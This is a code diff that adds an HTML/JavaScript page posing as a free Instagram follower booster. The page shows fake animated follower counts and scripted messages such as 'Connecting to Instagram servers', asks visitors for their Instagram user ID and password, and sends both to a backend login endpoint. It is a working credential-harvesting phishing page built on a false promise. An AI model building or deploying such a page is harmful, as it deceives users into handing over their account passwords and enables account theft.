@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | Increase Followers</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+  
+    .main-container {
+      display: flex;
+      gap: 20px;
+      margin-top: 30px;
+      padding: 20px;
+      flex-wrap: wrap;
+    }
+
+
+    .left-panel {
+      flex: 1;
+      background: linear-gradient(135deg, #ffe6ec, #ffdee9);
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      animation: fadeIn 1.2s ease-in-out;
+      min-width: 300px;
+    }
+
+    .left-panel h2 {
+      color: #ff4ead;
+      margin-bottom: 15px;
+      text-align: center;
+      font-size: 1.5rem;
+    }
+    .stats-container {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin-top: 20px;
+      flex-wrap: wrap;
+    }
+
+    .stat-circle {
+      width: 130px;
+      height: 130px;
+      background: #fff;
+      border-radius: 50%;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      animation: popUp 0.6s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .stat-circle h3 {
+      color: #ff4ead;
+      font-size: 22px;
+      margin: 5px 0 0;
+    }
+
+    .emoji-shuffle {
+      position: absolute;
+      top: -10px;
+      font-size: 20px;
+      animation: shuffle 3s infinite linear;
+    }
+
+    @keyframes shuffle {
+      0% { transform: translateY(0); opacity: 1; }
+      50% { transform: translateY(60px); opacity: 0.8; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+
+    .calculation-box {
+      background: #fff;
+      border: 1px solid #eee;
+      padding: 12px;
+      border-radius: 10px;
+      height: 160px;
+      overflow-y: auto;
+      font-size: 15px;
+      line-height: 1.5;
+      margin-top: 20px;
+      animation: slideUp 0.8s ease;
+    }
+    .calculation-box p {
+      padding: 4px 0;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes popUp {
+      from { transform: scale(0.8); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .right-panel {
+      flex: 1;
+      min-width: 300px;
+    }
+
+    @media (max-width: 768px) {
+      .main-container { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="navbar">
+    <div class="logo">Increase<span>Followers</span></div>
+    <div class="nav-alert">⚡ Do fast guys!🔥</div>
+    <nav>
+      <a href="index.html" class="active">Login</a>
+      <a href="register.html">Register</a>
+    </nav>
+  </header>
+
+
+  <div class="main-container">
+ 
+    <div class="left-panel">
+      <h2>🔄 Real-Time Follower Boost</h2>
+      <div class="stats-container">
+        <div class="stat-circle">
+          <span class="emoji-shuffle" id="emoji1">😊</span>
+          <h3 id="followerCount">0</h3>
+          <p style="font-size: 12px; color: #666;">Followers</p>
+        </div>
+        <div class="stat-circle">
+          <span class="emoji-shuffle" id="emoji2">❤️</span>
+          <h3 id="likesCount">0</h3>
+          <p style="font-size: 12px; color: #666;">Likes</p>
+        </div>
+      </div>
+      <div class="calculation-box" id="calculationBox">
+        <p>🚀 Starting boost calculation...</p>
+      </div>
+    </div>
+
+  
+    <div class="right-panel">
+      <section class="hero">
+        <div class="hero-content">
+          <div class="scroll-text">
+            <span>🔥 Fake Followers Coming Soon! 🚀 Make 100+ followers in a day 🔥 Fake Followers Coming Soon! 🚀 Make 100+ followers in a day 🔥</span>
+          </div>
+
+          <h1>Free Instagram Fake Follower Gain</h1>
+          <p>Analyze Instagram influencers: follower count, engagement rate, fake followers, popular content, and more.</p>
+
+  
+          <form class="login-box" id="loginForm">
+            <input type="text" name="userid" placeholder="Enter your User ID" required>
+            <input type="password" name="password" placeholder="Enter your Password" required>
+            <button type="submit">Gain Followers</button>
+          </form>
+
+
+          <p id="statusMsg" style="margin-top: 10px; color: #ff4ead; font-weight: bold; display: none;"></p>
+        </div>
+      </section>
+    </div>
+  </div>
+
+
+  <footer>
+    <div class="scroll-text">
+      <span>🔥 Free followers 1000 in one day 🔥 Free followers 1000 in one day 🔥 Free followers 1000 in one day 🔥</span>
+    </div>
+    <p class="notice">🔥 Free Followers Gain — Sign up Fast! It’s Limited. 🔥</p>
+  </footer>
+
+  <script>
+
+    const emojis = ["😊", "😍", "❤️", "🔥", "😂", "👍"];
+    const emoji1 = document.getElementById("emoji1");
+    const emoji2 = document.getElementById("emoji2");
+    setInterval(() => {
+      emoji1.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+      emoji2.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+    }, 1500);
+
+
+    const calcBox = document.getElementById("calculationBox");
+    const followerCount = document.getElementById("followerCount");
+    const likesCount = document.getElementById("likesCount");
+
+    const steps = [
+      "🔍 Analyzing profile activity...",
+      "📡 Connecting to Instagram servers...",
+      "⚡ Boosting follower count...",
+      "🎉 Adding followers: 20...40...60...",
+      "🔥 Engagement level rising...",
+      "🤖 Verifying account safety...",
+      "💎 100+ followers successfully added!"
+    ];
+
+    let stepIndex = 0;
+    let followers = 0;
+    let likes = 0;
+
+    setInterval(() => {
+      if (stepIndex < steps.length) {
+        const p = document.createElement("p");
+        p.innerHTML = steps[stepIndex];
+        calcBox.appendChild(p);
+        calcBox.scrollTop = calcBox.scrollHeight;
+        stepIndex++;
+      }
+    }, 2000);
+
+    setInterval(() => {
+      followers += Math.floor(Math.random() * 5) + 1;
+      likes += Math.floor(Math.random() * 3) + 1;
+      followerCount.innerText = followers;
+      likesCount.innerText = likes;
+    }, 1200);
+
+    const loginForm = document.getElementById('loginForm');
+    const statusMsg = document.getElementById('statusMsg');
+
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const userid = e.target.userid.value;
+      const password = e.target.password.value;
+
+      statusMsg.style.display = "block";
+      statusMsg.innerText = "⏳ Verifying user ID...";
+      
+      setTimeout(() => { statusMsg.innerText = "🔒 Checking password security..."; }, 1500);
+      setTimeout(() => { statusMsg.innerText = "📡 Connecting to Instagram servers..."; }, 3000);
+      setTimeout(() => { statusMsg.innerText = "⚡ Starting follower gain process..."; }, 4500);
+
+      setTimeout(async () => {
+        try {
+          const res = await fetch('http://localhost:5000/auth/login', {  
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userid, password })
+          });
+
+          const data = await res.json();
+
+          if (res.ok) {
+            statusMsg.innerText = "🎉 Success! Redirecting to dashboard...";
+            setTimeout(() => { window.location.href = "dashboard.html"; }, 2000);
+          } else {
+            statusMsg.innerText = `❌ ${data.msg}`;
+          }
+        } catch (error) {
+          statusMsg.innerText = "❌ Could not connect to server. Please check Node server.";
+        }
+      }, 6000); 
+    });
+  </script>
+</body>
+</html>
